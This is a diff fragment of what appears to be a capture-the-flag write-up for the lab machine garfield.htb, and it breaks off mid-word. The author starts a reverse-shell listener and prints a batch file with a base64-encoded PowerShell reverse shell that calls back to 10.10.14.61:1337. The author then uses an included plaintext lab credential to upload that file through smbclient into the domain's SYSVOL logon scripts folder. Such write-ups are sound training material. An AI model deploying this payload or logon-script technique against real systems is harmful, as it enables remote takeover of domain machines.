@@ -206,5 +206,50 @@ These are the 4 interesting writable objects from the output, and running `--det
 # Shell as `l.wilson`
 
 ```python
-
+ ❯❯❯ penelope -p 1337 
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
+
+First ill start a listener
+
+```python
+❯❯❯ cat script.bat 
+@echo off
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAxACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+```
+
+Then ill create the login script with just a powershell base64 encoded rev shell
+
+```python
+❯❯❯ smbclient //dc01.garfield.htb/SYSVOL -U 'j.arbuckle'%'Th1sD4mnC4t!@1978'  
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Aug 13 12:04:43 2025
+  ..                                  D        0  Wed Aug 13 12:04:43 2025
+  garfield.htb                       Dr        0  Wed Aug 13 12:04:43 2025
+
+		9250815 blocks of size 4096. 982443 blocks available
+smb: \> cd garfield.htb\
+smb: \garfield.htb\> ls
+  .                                   D        0  Wed Aug 13 12:11:05 2025
+  ..                                  D        0  Wed Aug 13 12:11:05 2025
+  DfsrPrivate                      DHSr        0  Wed Aug 13 12:11:05 2025
+  Policies                            D        0  Wed Aug 13 12:04:48 2025
+  scripts                             D        0  Tue Jan 27 22:13:47 2026
+
+		9250815 blocks of size 4096. 982443 blocks available
+smb: \garfield.htb\> cd scripts\
+smb: \garfield.htb\scripts\> put script.bat 
+putting file script.bat as \garfield.htb\scripts\script.bat (32.4 kB/s) (average 32.4 kB/s)
+smb: \garfield.htb\scripts\> dir
+  .                                   D        0  Tue Nov 10 02:59:35 2026
+  ..                                  D        0  Tue Nov 10 02:59:35 2026
+  printerDetect.bat                   A      217  Fri Sep 12 23:20:29 2025
+  script.bat                          A     1361  Tue Nov 10 02:59:35 2026
+
+		9250815 blocks of size 4096. 982442 blocks available
+smb: \garfield.htb\scripts\>
+```
+
+T
